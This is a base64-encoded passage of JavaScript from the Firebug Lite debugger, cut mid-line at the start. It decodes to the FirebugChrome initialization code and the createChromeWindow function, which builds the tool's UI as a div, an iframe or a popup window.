ZS5zeXNvdXQoIkZpcmVidWdDaHJvbWUuY3JlYXRlIiwgImNyZWF0aW5nIGNocm9tZSB3aW5kb3ciKTsNCiAgICAgICAgDQogICAgICAgIGNyZWF0ZUNocm9tZVdpbmRvdygpOw0KICAgIH0sDQogICAgDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0lOSVRJQUxJWkUpIEZCVHJhY2Uuc3lzb3V0KCJGaXJlYnVnQ2hyb21lLmluaXRpYWxpemUiLCAiaW5pdGlhbGl6aW5nIGNocm9tZSB3aW5kb3ciKTsNCiAgICAgICAgDQogICAgICAgIGlmIChFbnYuY2hyb21lLnR5cGUgPT0gImZyYW1lIiB8fCBFbnYuY2hyb21lLnR5cGUgPT0gImRpdiIpDQogICAgICAgICAgICBDaHJvbWVNaW5pLmNyZWF0ZShFbnYuY2hyb21lKTsNCiAgICAgICAgDQogICAgICAgIHZhciBjaHJvbWUgPSBGaXJlYnVnLmNocm9tZSA9IG5ldyBDaHJvbWUoRW52LmNocm9tZSk7DQogICAgICAgIEZpcmVidWdDaHJvbWUuY2hyb21lTWFwW2Nocm9tZS50eXBlXSA9IGNocm9tZTsNCiAgICAgICAgDQogICAgICAgIGFkZEdsb2JhbEV2ZW50KCJrZXlkb3duIiwgb25HbG9iYWxLZXlEb3duKTsNCiAgICAgICAgDQogICAgICAgIGlmIChFbnYuT3B0aW9ucy5lbmFibGVQZXJzaXN0ZW50ICYmIGNocm9tZS50eXBlID09ICJwb3B1cCIpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIHBlcnNpc3QgLSByZXZpc2UgY2hyb21lIHN5bmNocm9uaXphdGlvbiB3aGVuIGluIHBlcnNpc3RlbnQgbW9kZQ0KICAgICAgICAgICAgdmFyIGZyYW1lID0gRmlyZWJ1Z0Nocm9tZS5jaHJvbWVNYXAuZnJhbWU7DQogICAgICAgICAgICBpZiAoZnJhbWUpDQogICAgICAgICAgICAgICAgZnJhbWUuY2xvc2UoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy9jaHJvbWUucmVhdHRhY2goZnJhbWUsIGNocm9tZSk7DQogICAgICAgICAgICAvL1RPRE86IHh4eHBlZHJvIHBlcnNpc3Qgc3luY2hyb25pemU/DQogICAgICAgICAgICBjaHJvbWUuaW5pdGlhbGl6ZSgpOw0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICBjbG9uZTogZnVuY3Rpb24oRkJDaHJvbWUpDQogICAgew0KICAgICAgICBmb3IgKHZhciBuYW1lIGluIEZCQ2hyb21lKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcHJvcCA9IEZCQ2hyb21lW25hbWVdOw0KICAgICAgICAgICAgaWYgKEZCQ2hyb21lLmhhc093blByb3BlcnR5KG5hbWUpICYmICFpc0Z1bmN0aW9uKHByb3ApKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXNbbmFtZV0gPSBwcm9wOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfTsNCg0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQ2hyb21lIFdpbmRvdyBDcmVhdGlvbg0KDQp2YXIgY3JlYXRlQ2hyb21lV2luZG93ID0gZnVuY3Rpb24ob3B0aW9ucykNCnsNCiAgICBvcHRpb25zID0gZXh0ZW5kKFdpbmRvd0RlZmF1bHRPcHRpb25zLCBvcHRpb25zIHx8IHt9KTsNCiAgICANCiAgICAvLyogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBMb2NhbHMNCg0KICAgIHZhciBicm93c2VyV2luID0gRW52LmJyb3dzZXIud2luZG93Ow0KICAgIHZhciBicm93c2VyQ29udGV4dCA9IG5ldyBDb250ZXh0KGJyb3dzZXJXaW4pOw0KICAgIHZhciBwcmVmcyA9IFN0b3JlLmdldCgiRmlyZWJ1Z0xpdGUiKTsNCiAgICB2YXIgcGVyc2lzdGVkU3RhdGUgPSBwcmVmcyAmJiBwcmVmcy5wZXJzaXN0ZWRTdGF0ZSB8fCBkZWZhdWx0UGVyc2lzdGVkU3RhdGU7DQogICAgDQogICAgdmFyIGNocm9tZSA9IHt9LA0KICAgICAgICANCiAgICAgICAgY29udGV4dCA9IG9wdGlvbnMuY29udGV4dCB8fCBFbnYuYnJvd3NlciwNCiAgICANCiAgICAgICAgdHlwZSA9IGNocm9tZS50eXBlID0gRW52Lk9wdGlvbnMuZW5hYmxlUGVyc2lzdGVudCA/IA0KICAgICAgICAgICAgICAgICJwb3B1cCIgOiANCiAgICAgICAgICAgICAgICBvcHRpb25zLnR5cGUsDQogICAgICAgIA0KICAgICAgICBpc0Nocm9tZUZyYW1lID0gdHlwZSA9PSAiZnJhbWUiLA0KICAgICAgICANCiAgICAgICAgdXNlTG9jYWxTa2luID0gRW52LnVzZUxvY2FsU2tpbiwNCiAgICAgICAgDQogICAgICAgIHVybCA9IHVzZUxvY2FsU2tpbiA/IA0KICAgICAgICAgICAgICAgIEVudi5Mb2NhdGlvbi5za2luIDogDQogICAgICAgICAgICAgICAgImFib3V0OmJsYW5rIiwNCiAgICAgICAgDQogICAgICAgIC8vIGRvY3VtZW50LmJvZHkgbm90IGF2YWlsYWJsZSBpbiBYTUwrWFNMIGRvY3VtZW50cyBpbiBGaXJlZm94DQogICAgICAgIGJvZHkgPSBjb250ZXh0LmRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJib2R5IilbMF0sDQogICAgICAgICAgICAgICAgDQogICAgICAgIGZvcm1hdE5vZGUgPSBmdW5jdGlvbihub2RlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIUVudi5pc0RlYnVnTW9kZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBub2RlLmZpcmVidWdJZ25vcmUgPSB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgYnJvd3NlcldpblNpemUgPSBicm93c2VyQ29udGV4dC5nZXRXaW5kb3dTaXplKCk7DQogICAgICAgICAgICB2YXIgaGVpZ2h0ID0gcGVyc2lzdGVkU3RhdGUuaGVpZ2h0IHx8IDMwMDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaGVpZ2h0ID0gTWF0aC5taW4oYnJvd3NlcldpblNpemUuaGVpZ2h0LCBoZWlnaHQpOw0KICAgICAgICAgICAgaGVpZ2h0ID0gTWF0aC5tYXgoMjAwLCBoZWlnaHQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBub2RlLnN0eWxlLmJvcmRlciA9ICIwIjsNCiAgICAgICAgICAgIG5vZGUuc3R5bGUudmlzaWJpbGl0eSA9ICJoaWRkZW4iOw0KICAgICAgICAgICAgbm9kZS5zdHlsZS56SW5kZXggPSAiMjE0NzQ4MzY0NyI7IC8vIE1BWCB6LWluZGV4ID0gMjE0NzQ4MzY0Nw0KICAgICAgICAgICAgbm9kZS5zdHlsZS5wb3NpdGlvbiA9IG5vRml4ZWRQb3NpdGlvbiA/ICJhYnNvbHV0ZSIgOiAiZml4ZWQiOw0KICAgICAgICAgICAgbm9kZS5zdHlsZS53aWR0aCA9ICIxMDAlIjsgLy8gIjEwMiUiOyBJRSBhdXRvIG1hcmdpbiBidWcNCiAgICAgICAgICAgIG5vZGUuc3R5bGUubGVmdCA9ICIwIjsNCiAgICAgICAgICAgIG5vZGUuc3R5bGUuYm90dG9tID0gbm9GaXhlZFBvc2l0aW9uID8gIi0xcHgiIDogIjAiOw0KICAgICAgICAgICAgbm9kZS5zdHlsZS5oZWlnaHQgPSBoZWlnaHQgKyAicHgiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBhdm9pZCBmbGlja2VyaW5nIGR1cmluZyBjaHJvbWUgcmVuZGVyaW5nDQogICAgICAgICAgICAvL2lmIChpc0ZpcmVmb3gpDQogICAgICAgICAgICAvLyAgICBub2RlLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgIH0sDQogICAgICAgIA0KICAgICAgICBjcmVhdGVDaHJvbWVEaXYgPSBmdW5jdGlvbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vRmlyZWJ1Zy5Db25zb2xlLndhcm4oIkZpcmVidWcgTGl0ZSBHVUkgaXMgd29ya2luZyBpbiAnd2luZG93bGVzcyBtb2RlJy4gSXQgbWF5IGJlaGF2ZSBzbG93ZXIgYW5kIHJlY2VpdmUgaW50ZXJmZXJlbmNlcyBmcm9tIHRoZSBwYWdlIGluIHdoaWNoIGl0IGlzIGluc3RhbGxlZC4iKTsNCiAgICAgICAgDQogICAgICAgICAgICB2YXIgbm9kZSA9IGNocm9tZS5ub2RlID0gY3JlYXRlR2xvYmFsRWxlbWVudCgiZGl2IiksDQogICAgICAgICAgICAgICAgc3R5bGUgPSBjcmVhdGVHbG9iYWxFbGVtZW50KCJzdHlsZSIpLA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGNzcyA9IEZpcmVidWdDaHJvbWUuU2tpbi5DU1MNCiAgICAgICAgICAgICAgICAgICAgICAgIC8qDQogICAgICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvOy9nLCAiICFpbXBvcnRhbnQ7IikNCiAgICAgICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC8haW1wb3J0YW50XHMhaW1wb3J0YW50L2csICIhaW1wb3J0YW50IikNCiAgICAgICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC9kaXNwbGF5XHMqOlxzKihcdyspXHMqIWltcG9ydGFudDsvZywgImRpc3BsYXk6JDE7IikqLywNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIHJlc2V0IHNvbWUgc3R5bGVzIHRvIG1pbmltaXplIGludGVyZmVyZW5jZSBmcm9tIHRoZSBtYWluIHBhZ2UncyBzdHlsZQ0KICAgICAgICAgICAgICAgIHJ1bGVzID0gIi5mYkJvZHkgKnttYXJnaW46MDtwYWRkaW5nOjA7Zm9udC1zaXplOjExcHg7bGluZS1oZWlnaHQ6MTNweDtjb2xvcjppbmhlcml0O30iICsNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGxvYWQgdGhlIGNocm9tZSBzdHlsZXMNCiAgICAgICAgICAgICAgICAgICAgICAgIGNzcyArDQogICAgICAgICAgICAgICAgICAgICAgICAvLyBhZGp1c3Qgc29tZSByZW1haW5pbmcgc3R5bGVzDQogICAgICAgICAgICAgICAgICAgICAgICAiLmZiQm9keSAjZmJIU3BsaXR0ZXJ7cG9zaXRpb246YWJzb2x1dGUgIWltcG9ydGFudDt9IC5mYkJvZHkgI2ZiSFRNTCBzcGFue2xpbmUtaGVpZ2h0OjE0cHg7fSAuZmJCb2R5IC5saW5lTm8gZGl2e2xpbmUtaGVpZ2h0OmluaGVyaXQgIWltcG9ydGFudDt9IjsNCiAgICAgICAgICAgIC8qDQogICAgICAgICAgICBpZiAoaXNJRSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBJRTcgQ1NTIGJ1ZyAoRmJDaHJvbWUgdGFibGUgYmlnZ2VyIHRoYW4gaXRzIHBhcmVudCBkaXYpIA0KICAgICAgICAgICAgICAgIHJ1bGVzICs9ICIuZmJCb2R5IHRhYmxlLmZiQ2hyb21le3Bvc2l0aW9uOiBzdGF0aWMgIWltcG9ydGFudDt9IjsNCiAgICAgICAgICAgIH0vKiovDQogICAgICAgICAgICANCiAgICAgICAgICAgIHN0eWxlLnR5cGUgPSAidGV4dC9jc3MiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoc3R5bGUuc3R5bGVTaGVldCkNCiAgICAgICAgICAgICAgICBzdHlsZS5zdHlsZVNoZWV0LmNzc1RleHQgPSBydWxlczsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBzdHlsZS5hcHBlbmRDaGlsZChjb250ZXh0LmRvY3VtZW50LmNyZWF0ZVRleHROb2RlKHJ1bGVzKSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQoc3R5bGUpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBub2RlLmNsYXNzTmFtZSA9ICJmYkJvZHkiOw0KICAgICAgICAgICAgbm9kZS5zdHlsZS5vdmVyZmxvdyA9ICJoaWRkZW4iOw0KICAgICAgICAgICAgbm9kZS5pbm5lckhUTUwgPSBnZXRDaHJvbWVEaXZUZW1wbGF0ZSgpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaXNJRSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBJRTcgQ1NTIGJ1ZyAoRmJDaHJvbWUgdGFibGUgYmlnZ2VyIHRoYW4gaXRzIHBhcmVudCBkaXYpDQogICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpew0KICAgICAgICAgICAgICAgIG5vZGUuZmlyc3RDaGlsZC5zdHlsZS5oZWlnaHQgPSAiMXB4IjsNCiAgICAgICAgICAgICAgICBub2RlLmZpcnN0Q2hpbGQuc3R5bGUucG9zaXRpb24gPSAic3RhdGljIjsNCiAgICAgICAgICAgICAgICB9LDApOw0KICAgICAgICAgICAgICAgIC8qKi8NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZm9ybWF0Tm9kZShub2RlKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgYm9keS5hcHBlbmRDaGlsZChub2RlKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY2hyb21lLndpbmRvdyA9IHdpbmRvdzsNCiAgICAgICAgICAgIGNocm9tZS5kb2N1bWVudCA9IGRvY3VtZW50Ow0KICAgICAgICAgICAgb25DaHJvbWVMb2FkKGNocm9tZSk7ICAgICAgICAgICAgDQogICAgICAgIH07DQogICAgDQogICAgLy8qICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgdHJ5DQogICAgew0KICAgICAgICAvLyogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyBjcmVhdGUgdGhlIENocm9tZSBhcyBhICJkaXYiICh3aW5kb3dsZXNzIG1vZGUpDQogICAgICAgIGlmICh0eXBlID09ICJkaXYiKQ0KICAgICAgICB7DQogICAgICAgICAgICBjcmVhdGVDaHJvbWVEaXYoKTsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy8qICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gY3JldGF0ZSB0aGUgQ2hyb21lIGFzIGFuICJpZnJhbWUiDQogICAgICAgIGVsc2UgaWYgKGlzQ2hyb21lRnJhbWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIENyZWF0ZSB0aGUgQ2hyb21lIEZyYW1lDQogICAgICAgICAgICB2YXIgbm9kZSA9IGNocm9tZS5ub2RlID0gY3JlYXRlR2xvYmFsRWxlbWVudCgiaWZyYW1lIik7DQogICAgICAgICAgICBub2RlLnNldEF0dHJpYnV0ZSgic3JjIiwgdXJsKTsNCiAgICAgICAgICAgIG5vZGUuc2V0QXR0cmlidXRlKCJmcmFtZUJvcmRlciIsICIwIik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZvcm1hdE5vZGUobm9kZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGJvZHkuYXBwZW5kQ2hpbGQobm9kZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIG11c3Qgc2V0IHRoZSBpZCBhZnRlciBhcHBlbmRpbmcgdG8gdGhlIGRvY3VtZW50LCBvdGhlcndpc2Ugd2lsbCBjYXVzZSBhbg0KICAgICAgICAgICAgLy8gc3RyYW5nZSBlcnJvciBpbiBJRSwgbWFraW5nIHRoZSBpZnJhbWUgbG9hZCB0aGUgcGFnZSBpbiB3aGljaCB0aGUgYm9va21hcmtsZXQNCiAgICAgICAgICAgIC8vIHdhcyBjcmVhdGVkIChsaWtlIGdldGZpcmVidWcuY29tKSwgYmVmb3JlIGxvYWRpbmcgdGhlIGluamVjdGVkIFVJIEhUTUwsDQogICAgICAgICAgICAvLyBnZW5lcmF0aW5nIGFuICJBY2Nlc3MgRGVuaWVkIiBlcnJvci4NCiAgICAgICAgICAgIG5vZGUuaWQgPSBvcHRpb25zLmlkOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAvLyogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyBjcmVhdGUgdGhlIENocm9tZSBhcyBhICJwb3B1cCINCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaGVpZ2h0ID0gcGVyc2lzdGVkU3RhdGUucG9wdXBIZWlnaHQgfHwgMzAwOw0KICAgICAgICAgICAgdmFyIGJyb3dzZXJXaW5TaXplID0gYnJvd3NlckNvbnRleHQuZ2V0V2luZG93U2l6ZSgpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgYnJvd3NlcldpbkxlZnQgPSB0eXBlb2YgYnJvd3Nlcldpbi5zY3JlZW5YID09ICJudW1iZXIiID8gDQogICAgICAgICAgICAgICAgICAgIGJyb3dzZXJXaW4uc2NyZWVuWCA6IGJyb3dzZXJXaW4uc2NyZWVuTGVmdDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHBvcHVwTGVmdCA9IHR5cGVvZiBwZXJzaXN0ZWRTdGF0ZS5wb3B1cExlZnQgPT0gIm51bWJlciIgPw0KICAgICAgICAgICAgICAgICAgICBwZXJzaXN0ZWRTdGF0ZS5wb3B1cExlZnQgOiBicm93c2VyV2luTGVmdDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIGJyb3dzZXJXaW5Ub3AgPSB0eXBlb2YgYnJvd3Nlcldpbi5zY3JlZW5ZID09ICJudW1iZXIiID8gDQogICAgICAgICAgICAgICAgICAgIGJyb3dzZXJXaW4uc2NyZWVuWSA6IGJyb3dzZXJXaW4uc2NyZWVuVG9wOw0KDQogICAgICAgICAgICB2YXIgcG9wdXBUb3AgPSB0eXBlb2YgcGVyc2lzdGVkU3RhdGUucG9wdXBUb3AgPT0gIm51bWJlciIgPw0KICAgICAgICAgICAgICAgICAgICBwZXJzaXN0ZWRTdGF0ZS5wb3B1cFRvcCA6DQogICAgICAgICAgICAgICAgICAgIE1hdGgubWF4KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgTWF0aC5taW4oDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicm93c2VyV2luVG9wICsgYnJvd3NlcldpblNpemUuaGVpZ2h0IC0gaGVpZ2h0LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gR29vZ2xlIENocm9tZSBidWcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmVlbi5hdmFpbEhlaWdodCAtIGhlaWdodCAtIDYxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHBvcHVwV2lkdGggPSB0eXBlb2YgcGVyc2lzdGVkU3RhdGUucG9wdXBXaWR0aCA9PSAibnVtYmVyIiA/IA0KICAgICAgICAgICAgICAgICAgICBwZXJzaXN0ZWRTdGF0ZS5wb3B1cFdpZHRoIDoNCiAgICAgICAgICAgICAgICAgICAgTWF0aC5tYXgoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBNYXRoLm1pbigNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyb3dzZXJXaW5TaXplLndpZHRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gT3BlcmEgb3BlbnMgcG9wdXAgaW4gYSBuZXcgdGFiIGlmIGl0J3MgdG9vIGJpZyENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmVlbi5hdmFpbFdpZHRoLTEwIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7DQoNCiAgICAgICAgICAgIHZhciBwb3B1cEhlaWdodCA9IHR5cGVvZiBwZXJzaXN0ZWRTdGF0ZS5wb3B1cEhlaWdodCA9PSAibnVtYmVyIiA/DQogICAgICAgICAgICAgICAgICAgIHBlcnNpc3RlZFN0YXRlLnBvcHVwSGVpZ2h0IDogMzAwOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgb3B0aW9ucyA9IFsNCiAgICAgICAgICAgICAgICAgICAgInRydWUsdG9wPSIsIHBvcHVwVG9wLA0KICAgICAgICAgICAgICAgICAgICAiLGxlZnQ9IiwgcG9wdXBMZWZ0LCANCiAgICAgICAgICAgICAgICAgICAgIixoZWlnaHQ9IiwgcG9wdXBIZWlnaHQsDQogICAgICAgICAgICAgICAgICAgICIsd2lkdGg9IiwgcG9wdXBXaWR0aCwgDQogICAgICAgICAgICAgICAgICAgICIscmVzaXphYmxlIiAgICAgICAgICANCiAgICAgICAgICAgICAgICBdLmpvaW4oIiIpLA0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbm9kZSA9IGNocm9tZS5ub2RlID0gY29udGV4dC53aW5kb3cub3BlbigNCiAgICAgICAgICAgICAgICAgICAgdXJsLCANCiAgICAgICAgICAgICAgICAgICAgInBvcHVwIiwgDQogICAgICAgICAgICAgICAgICAgIG9wdGlvbnMNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAobm9kZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIG5vZGUuZm9jdXMoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2goRSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJGaXJlYnVnIEVycm9yOiBGaXJlYnVnIHBvcHVwIHdhcyBibG9ja2VkLiIpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGFsZXJ0KCJGaXJlYnVnIEVycm9yOiBGaXJlYnVnIHBvcHVwIHdhcyBibG9ja2VkLiIpOw0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy8qICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gSW5qZWN0IHRoZSBpbnRlcmZhY2UgSFRNTCBpZiBpdCBpcyBub3QgdXNpbmcgdGhlIGxvY2FsIHNraW4NCiAgICAgICAgDQogICAgICAgIGlmICghdXNlTG9jYWxTa2luKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgdHBsID0gZ2V0Q2hyb21lVGVtcGxhdGUoIWlzQ2hyb21lRnJhbWUpLA0KICAgICAgICAgICAgICAgIGRvYyA9IGlzQ2hyb21lRnJhbWUgPyBub2RlLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQgOiBub2RlLmRvY3VtZW50Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBkb2Mud3JpdGUodHBsKTsNCiAgICAgICAgICAgIGRvYy5jbG9zZSgpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAvLyogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyBXYWl0IHRoZSBXaW5kb3cgdG8gYmUgbG9hZGVkDQogICAgICAgIA0KICAgICAgICB2YXIgd2luLA0KICAgICAgICANCiAgICAgICAgICAgIHdhaXREZWxheSA9IHVzZUxvY2FsU2tpbiA/IGlzQ2hyb21lRnJhbWUgPyAyMDAgOiAzMDAgOiAxMDAsDQogICAgICAgICAgICANCiAgICAgICAgICAgIHdhaXRGb3JXaW5kb3cgPSBmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKCAvLyBGcmFtZSBsb2FkZWQuLi4gT1INCiAgICAgICAgICAgICAgICAgICAgIGlzQ2hyb21lRnJhbWUgJiYgKHdpbj1ub2RlLmNvbnRlbnRXaW5kb3cpICYmDQogICAgICAgICAgICAgICAgICAgICBub2RlLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZiQ29tbWFuZExpbmUiKSB8fA0KICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAvLyBQb3B1cCBsb2FkZWQNCiAgICAgICAgICAgICAgICAgICAgICFpc0Nocm9tZUZyYW1lICYmICh3aW49bm9kZS53aW5kb3cpICYmIG5vZGUuZG9jdW1lbnQgJiYNCiAgICAgICAgICAgICAgICAgICAgIG5vZGUuZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZiQ29tbWFuZExpbmUiKSApDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjaHJvbWUud2luZG93ID0gd2luLndpbmRvdzsNCiAgICAgICAgICAgICAgICAgICAgY2hyb21lLmRvY3VtZW50ID0gd2luLmRvY3VtZW50Ow0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgLy8gUHJldmVudCBnZXR0aW5nIHRoZSB3cm9uZyBjaHJvbWUgaGVpZ2h0IGluIEZGIHdoZW4gb3BlbmluZyBhIHBvcHVwIA0KICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICAgICAgICAgICAgICBvbkNocm9tZUxvYWQoY2hyb21lKTsNCiAgICAgICAgICAgICAgICAgICAgfSwgdXNlTG9jYWxTa2luID8gMjAwIDogMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCh3YWl0Rm9yV2luZG93LCB3YWl0RGVsYXkpOw0KICAgICAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIHdhaXRGb3JXaW5kb3coKTsNCiAgICB9DQogICAgY2F0Y2goZSkNCiAgICB7DQogICAgICAgIHZhciBtc2cgPSBlLm1lc3NhZ2UgfHwgZTsNCiAgICAgICAgDQogICAgICAgIGlmICgvYWNjZXNzL2kudGVzdChtc2cpKQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyBGaXJlYnVnIExpdGUgY291bGQgbm90IGNyZWF0ZSBhIHdpbmRvdyBmb3IgaXRzIEdyYXBoaWNhbCBVc2VyIEludGVyZmFjZSBkdWUgdG8NCiAgICAgICAgICAgIC8vIGEgYWNjZXNzIHJlc3RyaWN0aW9uLiBUaGlzIGhhcHBlbnMgaW4gc29tZSBwYWdlcywgd2hlbiBsb2FkaW5nIHZpYSBib29rbWFya2xldC4NCiAgICAgICAgICAgIC8vIEluIHN1Y2ggY2FzZXMsIHRoZSBvbmx5IHdheSBpcyB0byBsb2FkIHRoZSBHVUkgaW4gYSAid2luZG93bGVzcyBtb2RlIi4NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGlzQ2hyb21lRnJhbWUpDQogICAgICAgICAgICAgICAgYm9keS5yZW1vdmVDaGlsZChub2RlKTsNCiAgICAgICAgICAgIGVsc2UgaWYodHlwZSA9PSAicG9wdXAiKQ0KICAgICAgICAgICAgICAgIG5vZGUuY2xvc2UoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gTG9hZCB0aGUgR1VJIGluIGEgIndpbmRvd2xlc3MgbW9kZSINCiAgICAgICAgICAgIGNyZWF0ZUNocm9tZURpdigpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgYWxlcnQoIkZpcmVidWcgRXJyb3I6IEZpcmVidWcgR1VJIGNvdWxkIG5vdCBiZSBjcmVhdGVkLiIpOw0KICAgICAgICB9DQogICAgfQ0KfTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAq